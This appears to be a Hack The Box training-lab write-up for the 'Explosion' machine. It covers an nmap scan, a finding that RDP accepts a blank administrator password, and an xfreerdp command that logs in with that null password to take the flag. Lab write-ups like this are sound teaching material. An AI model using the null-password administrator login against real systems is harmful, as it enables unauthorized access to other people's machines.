```toc
```
# HTB Notes - Explosion #

+ **Date**: 12-3-2022
+ **Author**: Noah Soqui
+ **Tags**: #RDP #Network

## Intelligence Gathering ##

Scanning the target
+ `sudo nmap -sV -sC -O 10.129.1.13` 
+ Output:
``` shell
Nmap scan report for 10.129.1.13
Host is up (0.045s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2022-12-04T05:13:43+00:00
|_ssl-date: 2022-12-04T05:13:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2022-12-03T05:11:48
|_Not valid after:  2023-06-04T05:11:48
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

## Misconfiguration and Vulnerability Analysis  ##

The RDP service can be accessed without a password, allowing easy access.

## Exploitation ##

Connect to a RDP service
+ `xfreerdp /u:administrator /p:'' /v:10.129.1.13`
	+ Note: Administrator is often a good choice as a username, and in this case a null password is passed and accepted

## Post Exploitation ##

Following the connection to the RDP service with <mark style="background: #FFB86CA6;">xfreerdp</mark> 
+ Able to navigate using the normal windows file system, and copy the flag

## Reporting ##

### Executive Summary ###

RDP is a helpful windows proprietary service to interact with a machine remotely. Though in this case it was configured to allow authentication without a password. This allows it to be accessed easily.